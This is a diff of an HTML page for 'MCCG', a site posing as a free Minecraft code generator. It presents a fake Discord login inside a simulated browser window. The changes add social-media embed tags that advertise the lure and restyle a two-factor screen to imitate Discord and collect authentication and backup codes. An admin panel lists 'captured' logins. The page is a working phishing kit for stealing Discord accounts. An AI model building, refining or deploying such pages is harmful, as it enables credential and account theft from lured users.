@@ -4,6 +4,21 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="stylesheet" href="styles.css">
+    
+    <!-- Discord Embed Meta Tags -->
+    <meta property="og:title" content="MCCG - Minecraft Code Generator">
+    <meta property="og:description" content="The most trusted Minecraft Code Generator 2026. Free users get 10 free codes upon sign up. Join thousands of players already using MCCG.">
+    <meta property="og:image" content="https://i.ibb.co/HDxMBCcJ/gpt-image-1-5-high-fidelity-a-Make-the-M-have-a-pu.png">
+    <meta property="og:url" content="https://mccg.pages.dev">
+    <meta property="og:type" content="website">
+    <meta name="theme-color" content="#5865f2">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="MCCG - Minecraft Code Generator">
+    <meta name="twitter:description" content="The most trusted Minecraft Code Generator 2026. Free users get 10 free codes upon sign up.">
+    <meta name="twitter:image" content="https://i.ibb.co/HDxMBCcJ/gpt-image-1-5-high-fidelity-a-Make-the-M-have-a-pu.png">
+
+    <link rel="icon" type="image/png" href="https://i.ibb.co/xS89yz2v/gpt-image-1-5-high-fidelity-a-Make-the-M-have-a-pu.png">
+    <link rel="apple-touch-icon" href="https://i.ibb.co/HDxMBCcJ/gpt-image-1-5-high-fidelity-a-Make-the-M-have-a-pu.png">
     <title>MCCG</title>
 </head>
 <body>
@@ -22,7 +37,7 @@
                 <div class="browser-window">
                     <div class="browser-chrome">
                         <div class="browser-tabs">
-                            <div class="browser-tab active" id="browser-tab">
+                            <div class="browser-tab active">
                                 <img id="tab-favicon" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%235865F2' d='M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057a.082.082 0 0 0 .031.057 19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028 14.09 14.09 0 0 0 1.226-1.994.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03zM8.02 15.33c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.956-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.956 2.418-2.157 2.418zm7.975 0c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.955-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.946 2.418-2.157 2.418z'/%3E%3C/svg%3E" alt="" class="tab-favicon">
                                 <span id="tab-title">Discord</span>
                             </div>
@@ -45,7 +60,7 @@
                         </div>
                     </div>
                     
-                    <div class="browser-content" id="browser-content">
+                    <div class="browser-content">
                         <iframe id="login-iframe" src="about:blank" frameborder="0" scrolling="no"></iframe>
                         <div id="error-page" class="error-page hidden">
                             <div class="error-content">
@@ -63,28 +78,18 @@
         </div>
     </div>
 
-    <!-- 2FA Screen -->
+    <!-- 2FA Screen (Discord Style) -->
     <div id="twofa-screen" class="screen hidden">
-        <div class="twofa-box">
-            <div class="twofa-icon">
-                <svg viewBox="0 0 24 24" width="48" height="48" fill="#5865f2">
-                    <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 4l6 2.67V11c0 3.45-2.56 6.68-6 7.74V5z"/>
-                </svg>
-            </div>
-            <h1>Two-Factor Authentication</h1>
-            <p class="twofa-subtitle">Please authenticate using your authenticator app. A notification has also been sent to your registered email address.</p>
-            <div class="twofa-notice">
-                <svg viewBox="0 0 24 24" width="16" height="16" fill="#faa61a">
-                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
-                </svg>
-                <p>If you do not have 2FA enabled on your account, please enable it in your Discord settings under Privacy &amp; Safety before continuing.</p>
-            </div>
-            <div class="twofa-input-wrapper">
-                <label for="twofa-input">Authentication Code</label>
-                <input type="text" id="twofa-input" placeholder="Enter 6-digit code" maxlength="8" autocomplete="off" spellcheck="false">
-            </div>
-            <button id="twofa-submit-btn" class="primary-btn full-width">Verify</button>
-            <p class="twofa-support">Having trouble? <a href="/support">Contact Support</a></p>
+        <div class="discord-twofa-modal">
+            <img src="https://uxwing.com/wp-content/themes/uxwing/download/household-and-furniture/key-black-icon.png" class="twofa-key-icon" alt="Key">
+            <h2>Two-factor authentication</h2>
+            <p class="twofa-description">You can use a backup code or your two-factor authentication mobile app.</p>
+            <label class="twofa-label">
+                ENTER DISCORD AUTH/BACKUP CODE <span class="twofa-required">*</span>
+            </label>
+            <input type="text" id="twofa-input" class="twofa-box-input" placeholder="6-digit authentication code/8-digit backup code" maxlength="8">
+            <button id="twofa-submit-btn" class="twofa-login-btn">Log In</button>
+            <button id="twofa-back-btn" class="twofa-back-btn">Go Back to Login</button>
         </div>
     </div>
 
@@ -148,8 +153,14 @@
     <div id="admin-screen" class="screen hidden">
         <div class="admin-panel">
             <header class="admin-header">
-                <h1>MCCG Admin Panel</h1>
-                <button id="admin-logout-btn" class="secondary-btn">Back to Login</button>
+                <div class="admin-header-left">
+                    <img src="https://i.ibb.co/HDxMBCcJ/gpt-image-1-5-high-fidelity-a-Make-the-M-have-a-pu.png" alt="MCCG" class="admin-logo">
+                    <h1>MCCG Admin Panel</h1>
+                </div>
+                <div class="admin-header-right">
+                    <a href="/support" class="secondary-btn" style="text-decoration:none;">Support Tickets</a>
+                    <button id="admin-logout-btn" class="secondary-btn">Back to Login</button>
+                </div>
             </header>
 
             <div class="admin-content">
@@ -198,15 +209,12 @@
                                 </tr>
                             </thead>
                             <tbody id="users-tbody">
-                                <tr>
-                                    <td colspan="5" class="empty-state">No logins captured yet</td>
-                                </tr>
+                                <tr><td colspan="5" class="empty-state">No logins captured yet</td></tr>
                             </tbody>
                         </table>
                     </div>
                 </section>
 
-                <!-- Support Tickets -->
                 <section class="admin-section">
                     <div class="section-header">
                         <h2>Support Tickets</h2>
@@ -235,7 +243,23 @@
         </div>
     </div>
 
-    <!-- Admin Access Button -->
+    <!-- Close Ticket Modal -->
+    <div id="close-ticket-modal" class="modal hidden">
+        <div class="modal-backdrop" id="close-ticket-backdrop"></div>
+        <div class="modal-content">
+            <h2 style="color:var(--accent-danger)">Close Ticket</h2>
+            <p>Please provide a reason for closing this ticket.</p>
+            <div class="modal-input-wrapper">
+                <label for="close-reason-input">Reason</label>
+                <textarea id="close-reason-input" placeholder="Reason for closing..." rows="3" maxlength="300"></textarea>
+            </div>
+            <div class="modal-buttons">
+                <button id="cancel-close-btn" class="secondary-btn">Cancel</button>
+                <button id="confirm-close-btn" class="danger-btn">Close Ticket</button>
+            </div>
+        </div>
+    </div>
+
     <button id="admin-access-btn" class="admin-access-btn hidden">Admin</button>
 
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
